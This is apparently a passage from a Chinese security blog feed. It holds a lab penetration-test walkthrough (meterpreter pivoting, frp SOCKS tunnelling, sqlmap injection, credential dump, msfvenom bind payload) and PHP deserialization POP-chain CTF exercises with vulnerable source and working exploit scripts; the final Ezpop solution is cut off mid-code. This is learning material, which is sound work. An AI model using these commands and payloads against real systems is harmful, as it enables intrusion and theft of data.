class="line">在meterpreter下</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913173901521.png" alt="image-20210913173901521"></p><p>收到会话，成功拿到<code>meterperter</code>进入主机</p><p>用 <code>MSF</code> 中的这个命令获取当前的网段：</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913212439481.png" alt="image-20210913212439481"></p><p><code>meterpreter</code>中添加路由信息：<code>run autoroute -s 192.168.22.0/24</code></p><p>使用代理模块构建代理</p><p><code>vim /etc/proxychains4.conf</code>配置代理工具</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210913191947615.png" alt="image-20210913191947615"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.22.0/24</span><br><span class="line">run autoroute -p</span><br><span class="line">route</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917161014242.png" alt="image-20210917161014242"></p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><p>对192.168.22.0/24段进行扫描</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210917160758243.png" alt="image-20210917160758243"></p><p>扫到   192.268.22.129这一堆</p><p>同时学习了 frp流量转发 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">frp流量转发  </span><br><span class="line">攻击机 安装frp</span><br><span class="line">配置端口  </span><br><span class="line">[common]</span><br><span class="line">server_addr = 10.203.87.148</span><br><span class="line">server_port = 7000</span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">plugin = socks5</span><br><span class="line">remote_port =9091</span><br><span class="line">上传frpc  和frpc.ini文件到靶机  权限改为777</span><br><span class="line">靶机运行 ./frpc</span><br><span class="line">攻击机运行 ./frps -c frps.ini   </span><br></pre></td></tr></table></figure><p>流量转发成功。</p><p><img src="image-20210913214913042.png" alt="image-20210913214913042"></p><p><img src="image-20210913214628063.png" alt="image-20210913214628063"></p><p>是个八哥cms</p><p><img src="image-20210918183457411.png" alt="image-20210918183457411"></p><p>扫一下目录</p><p><img src="image-20210914111225355.png" alt="image-20210914111225355"></p><p>先查看 robots.txt</p><p><img src="image-20210914111327786.png" alt="image-20210914111327786"></p><p>捡到宝啦 </p><p><img src="image-20210915134225965.png" alt="image-20210915134225965"></p><p><img src="image-20210914112917498.png" alt="image-20210914112917498"></p><p>怀疑有sql  给 sqlmap配个socks代理哦</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py --proxy socks5://10.203.87.148:1234 -u &quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot; -p keyword</span><br></pre></td></tr></table></figure><p><img src="image-20210914205706242.png" alt="image-20210914205706242"></p><p>跑出来；了  找找密码  随手dump数据库</p><p><img src="image-20210914205853366.png" alt="image-20210914205853366"></p><p>找到密码 登上去  米西米西  </p><p><code>admin/123qwe</code></p><p><img src="image-20210914205955876.png" alt="image-20210914205955876"></p><p>bagecms V3.1.3 存在  后台任意文件读取漏洞</p><p><img src="image-20210914212345124.png" alt="image-20210914212345124"></p><p>活捉   </p><p><img src="image-20210914214541122.png" alt="image-20210914214541122"></p><p>火速上车</p><p><code>ifconfig</code></p><p><img src="image-20210915134001181.png" alt="image-20210915134001181"></p><p>使用proxifiter将流量代理到10.203.87.119:1080端口使用工具，连接webshell。 下一台的情况和这台差不多，双网卡还存在一个33网段的ip，进行存活主机探测下一个 靶机  应该是通过192.168.33.0/24这块网卡继续  </p><p>使用<code>uname -a</code>查询靶机版本信息</p><p>msf生成一个  正向链接的 马    给 777</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=54321 -f elf &gt; mbg.elf</span><br></pre></td></tr></table></figure><p>然后连接以后 </p><p>添加路由 </p><p>信息收集  </p><p>扫端口  </p><p>445  永恒之蓝，</p><p>靶机  跑了     。。。。。。。</p><p><strong>反思</strong></p><p>   1.对于各种  流程太不熟悉  做完一块以后   不知道  该干啥      </p><ol start="2"><li>msf不会用,   得学    下次 写总结  。</li><li>对于  网络拓补   相关知识 细节方面 不够了解   有时候知道</li><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php反序列化练习</title>
      <link href="/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/"/>
      <url>/2021/08/25/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%83%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<blockquote><p>php反序列化中针对pop链的学习和练习</p></blockquote><h4 id="POP-面向属性编程"><a href="#POP-面向属性编程" class="headerlink" title="POP:面向属性编程"></a>POP:面向属性编程</h4><p>面向属性编程（Property-Oriented Programing）常用于上层语言构造特定调用链的方法，与二进制利用中的面向返回编程（Return-Oriented Programing）的原理相似，都是从现有运行环境中寻找一系列的代码或者指令调用，然后根据需求构成一组连续的调用链。在控制代码或者程序的执行流程后就能够使用这一组调用链做一些工作了。</p><span id="more"></span><p>基本概念</p><p>在二进制利用时，ROP 链构造中是寻找当前系统环境中或者内存环境里已经存在的、具有固定地址且带有返回操作的指令集，而 POP 链的构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作。二进制中通常是由于内存溢出控制了指令执行流程，而反序列化过程就是控制代码执行流程的方法之一，当然进行反序列化的数据能够被用户输入所控制。</p><p>练习1</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">error_reporting(0);</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var;</span><br><span class="line">    public function file_get($value)</span><br><span class="line">    &#123;</span><br><span class="line">        $text = base64_encode(file_get_contents($value));</span><br><span class="line">        return $text;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __invoke()&#123;</span><br><span class="line">        $content = $this-&gt;file_get($this-&gt;var);</span><br><span class="line">        echo $content;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show</span><br><span class="line">&#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">    public function __construct($file=&#x27;index.php&#x27;)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;source = $file;</span><br><span class="line">        echo $this-&gt;source.&#x27;Welcome&#x27;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;str[&#x27;str&#x27;]-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function _show()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&#x27;/gopher|http|ftp|https|dict|\.\.|flag|file/i&#x27;,$this-&gt;source))  &#123;</span><br><span class="line">            die(&#x27;hacker&#x27;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            highlight_file($this-&gt;source); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">            echo &quot;hacker&quot;;</span><br><span class="line">            $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test</span><br><span class="line">&#123;</span><br><span class="line">    public $p;</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;p = array();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __get($key)</span><br><span class="line">    &#123;</span><br><span class="line">        $function = $this-&gt;p;</span><br><span class="line">        return $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;hello&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    unserialize($_GET[&#x27;hello&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    $show = new Show(&#x27;pop3.php&#x27;);</span><br><span class="line">    $show-&gt;_show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>接下来我们来分析构造pop链的过程</p><p>很明显此题考查PHP反序列化构造POP链，遇到此类题型首先寻找可以读取文件的函数，再去寻找可以互相触发从而调用的魔术方法，最终形成一条可以触发读取文件函数的POP链。<br>对于此题可以看到我们的目的是通过构造反序列化读取flag.php文件，在Read类有file_get_contents()函数，Show类有highlight_file()函数可以读取文件。接下来寻找目标点可以看到在最后几行有unserialize函数存在，该函数的执行同时会触发wakeup魔术方法，而wakeup魔术方法可以看到在Show类中。<br>再次看下<code>__wakeup</code>魔术方法中，存在一个正则匹配函数preg_match()，该函数第二个参数应为字符串，这里把source当作字符串进行的匹配，这时若这个source是某个类的对象的话，就会触发这个类的<code>__tostring</code>方法，通篇看下代码发现<code>__tostring</code>魔术方法也在Show类中，那么我们一会构造exp时将source变成Show这个类的对象就会触发<code>__tostring</code>方法。<br>再看下<code>__tostring</code>魔术方法中，首先找到str这个数组，取出key值为str的value值赋给source，那么如果这个value值不存在的话就会触发<code>__get</code>魔术方法。再次通读全篇，看到Test类中存在<code>__get</code>魔术方法。<br>那么此时如果str数组中key值为str对应的value值source是Test类的一个对象，就触发了<code>__get</code>魔术方法。看下<code>__get</code>魔术方法，发现先取Test类中的属性p给function变量，再通过return $function()把它当作函数执行，这里属性p可控。这样就会触发<code>__invoke</code>魔术方法，而<code>__invoke</code>魔术方法存在于Read类中。<br>可以看到<code>__invoke</code>魔术方法中调用了该类中的file_get方法，形参是var属性值（这里我们可以控制），实参是value值，从而调用file_get_contents函数读取文件内容，所以只要将Read类中的var属性值赋值为flag.php即可<br>POP链：unserialize函数（变量可控）–&gt;<code>__wakeup()魔术方法</code>–&gt;<code>__tostring()魔术方法</code>–&gt;<code>__get魔术方法</code>–&gt;<code>__invoke</code>魔术方法–&gt;触发Read类中的file_get方法–&gt;触发file_get_contents函数读取flag.php</p><p>exp：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Read &#123;</span><br><span class="line">    public $var = &quot;flag.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show &#123;</span><br><span class="line">    public $source;</span><br><span class="line">    public $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test &#123;</span><br><span class="line">    public $p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$r = new Read();</span><br><span class="line">$s = new Show();</span><br><span class="line">$t = new Test();</span><br><span class="line">$t-&gt;p = $r; //赋值Test类的对象($t)下的属性p为Read类的对象($r)，触发__invoke魔术方法</span><br><span class="line">$s-&gt;str[&#x27;str&#x27;] = $t;//赋值Show类的对象($s)下的str数组的str键的值为 Test类的对象$t ，触发__get魔术方法。</span><br><span class="line">$s-&gt;source = $s;//令 Show类的对象($s)下的source属性值为此时上一步已经赋值过的$s对象，从而把对象当作字符串调用触发。__tostring魔术方法</span><br><span class="line">echo urlencode((serialize($s)));</span><br></pre></td></tr></table></figure><p>这里使用urlencode是为了编码 private 和protect属性，防止他们序列化出来有 %00 造成截断</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211000665.png" alt="image-20210908211000665"></p><p>最后得出来的payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Br%3A1%3Bs%3A3%3A%22str%22%3Ba%3A1%3A%7Bs%3A3%3A%22str%22%3BO</span><br></pre></td></tr></table></figure><p>最后利用结果</p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908210939860.png" alt="image-20210908210939860"></p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211056738.png" alt="image-20210908211056738"></p><p>练习2</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __destruct()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod1-&gt;test1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">            $this-&gt;mod1-&gt;test2();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __call($test2,$arr)</span><br><span class="line">        &#123;</span><br><span class="line">                $s1 = $this-&gt;mod1;</span><br><span class="line">                $s1();</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">        public $mod1;</span><br><span class="line">        public $mod2;</span><br><span class="line">        public function __invoke()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;mod2 = &quot;字符串拼接&quot;.$this-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">        public $str1;</span><br><span class="line">        public $str2;</span><br><span class="line">        public function __toString()</span><br><span class="line">        &#123;</span><br><span class="line">                $this-&gt;str1-&gt;get_flag();</span><br><span class="line">                return &quot;1&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">        public function get_flag()</span><br><span class="line">        &#123;</span><br><span class="line">                echo &quot;flag:&quot;.&quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[&#x27;string&#x27;];</span><br><span class="line">unserialize($a);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class start_gg</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1;</span><br><span class="line">    public $mod2;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new Call();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __destruct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test1(); # 入口点，mod1可通过附值起跳。</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Call</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化funct</span><br><span class="line">    public $mod2; # 无它什么事</span><br><span class="line"></span><br><span class="line">    # 继续起跳，瞻前顾后，思考下面的 $this-&gt;mod1-&gt;test2();会在何处被什么利用</span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new funct();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function test1()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1-&gt;test2(); # 这里调 __call</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class funct</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化func</span><br><span class="line">    public $mod2; # 无它什么事</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new func();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __call($test2, $arr)</span><br><span class="line">    &#123;</span><br><span class="line">        $s1 = $this-&gt;mod1;</span><br><span class="line">        $s1(); # 这里触发 __invoke</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class func</span><br><span class="line">&#123;</span><br><span class="line">    public $mod1; # 实例化string1</span><br><span class="line">    public $mod2; # __invoke对其附值，其实是为了调 __toString</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod1 = new string1();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __invoke()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;mod2 = &quot;字符串拼接&quot; . $this-&gt;mod1; # 这里若拼接则会触发 __toString</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class string1</span><br><span class="line">&#123;</span><br><span class="line">    public $str1; # 实例化 GetFlag</span><br><span class="line">    public $str2;</span><br><span class="line"></span><br><span class="line">    public function __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1 = new GetFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function __toString()</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;str1-&gt;get_flag(); #调用此处即可getflag，难点：需调用 __toString</span><br><span class="line">        return &quot;1&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class GetFlag</span><br><span class="line">&#123;</span><br><span class="line">    public function get_flag()</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;flag:&quot; . &quot;xxxxxxxxxxxx&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$payload = new start_gg();</span><br><span class="line">echo urlencode(serialize($payload));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211221621.png" alt="image-20210908211221621"></p><p><img src="E:/机密文件/hexo/blog/source/_posts/image-20210908211251456.png" alt="image-20210908211251456"></p><h1 id="MRCTF2020-Ezpop"><a href="#MRCTF2020-Ezpop" class="headerlink" title="[MRCTF2020]Ezpop"></a>[MRCTF2020]Ezpop</h1><p>知识点：php反序列化构造pop链</p><p>源码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag is in flag.php</span><br><span class="line">//WTF IS THIS?</span><br><span class="line">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span><br><span class="line">//And Crack It!</span><br><span class="line">class Modifier &#123;</span><br><span class="line">  protected $var;</span><br><span class="line">  public function append($value)&#123;</span><br><span class="line">    include($value);</span><br><span class="line">  &#125;</span><br><span class="line">  public function __invoke()&#123;</span><br><span class="line">    $this-&gt;append($this-&gt;var);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Show&#123;</span><br><span class="line">  public $source;</span><br><span class="line">  public $str;</span><br><span class="line">  public function __construct($file=&#x27;index.php&#x27;)&#123;</span><br><span class="line">    $this-&gt;source = $file;</span><br><span class="line">    echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  public function __toString()&#123;</span><br><span class="line">    return $this-&gt;str-&gt;source;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __wakeup()&#123;</span><br><span class="line">    if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;, $this-&gt;source)) &#123;</span><br><span class="line">      echo &quot;hacker&quot;;</span><br><span class="line">      $this-&gt;source = &quot;index.php&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Test&#123;</span><br><span class="line">  public $p;</span><br><span class="line">  public function __construct()&#123;</span><br><span class="line">    $this-&gt;p = array();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public function __get($key)&#123;</span><br><span class="line">    $function = $this-&gt;p;</span><br><span class="line">    return $function();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&#x27;pop&#x27;]))&#123;</span><br><span class="line">  @unserialize($_GET[&#x27;pop&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">  $a=new Show;</span><br><span class="line">  highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据以上代码，当用get方法传一个pop参数后，会自动调用Show类的<code>_wakeup()</code>魔术方法。<br><code>_wakeup()</code>通过preg_match()将$this-&gt;source做字符串比较，如果$this-&gt;source是Show类，就调用了<code>__toString()</code>方法；如果<code>__toString()</code>其中str赋值为一个实例化的Test类，那么其类不含有source属性，所以会调用Test中的<code>_get()</code>方法。如果<code>_get()</code>中的p赋值为Modifier类，那么相当于Modifier类被当作函数处理，所以会调用Modifier类中的<code>_invoke()</code>方法。利用include的文件包含漏洞，使用<code>_invoke()</code>读取flag.php的内容。</p><p>思路：首先反序列化一个实例化的Show($a),就会调用<code>_wakeup()</code>,其中$a会被赋值给source。所以让$a是一个实例化的Show类，这样就会调用<code>_tostring()</code>,然后让里面的$a这个Show类中的str赋值为Test()类，然后让str这个Test()类中的p赋值为Modifier()类。<br>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class 